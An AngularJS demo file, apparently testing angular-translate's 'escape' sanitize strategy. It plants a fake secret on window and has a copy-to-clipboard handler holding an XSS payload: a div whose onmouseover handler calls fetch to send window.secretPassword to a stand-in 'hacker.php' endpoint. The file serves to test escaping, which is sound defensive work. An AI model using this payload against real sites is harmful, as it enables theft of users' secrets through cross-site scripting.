var translations = {};

var app = angular.module('myApp_sanitize', [
  'pascalprecht.translate',
  'ngSanitize',
]);

app.config([
  '$translateProvider',
  function ($translateProvider) {
    $translateProvider.translations('en', translations);
    $translateProvider.preferredLanguage('en');

    $translateProvider.useSanitizeValueStrategy('escape'); // works regardless

    window.secretPassword = 'super-secret-password';
  },
]);

app.controller('Ctrl', [
  '$scope',
  function ($scope) {
    $scope.input = '';

    $scope.copyToClipboard = function () {
      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + window.secretPassword);">MOUSE OVER ME!</div>`;
      navigator.clipboard.writeText(str);
    };
  },
]);
